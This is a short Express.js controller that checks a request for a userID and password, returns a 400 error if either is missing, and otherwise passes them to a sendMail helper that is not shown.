const { sendMail } = require('../helpers/sendMail')

const send = (req, res) => {
  const { userID, password } = req.body
  if (!userID || !password) {
    res.status(400).json({ error: 'userID and password required' })
    return
  }

  sendMail(userID, password, res)
}

module.exports = send
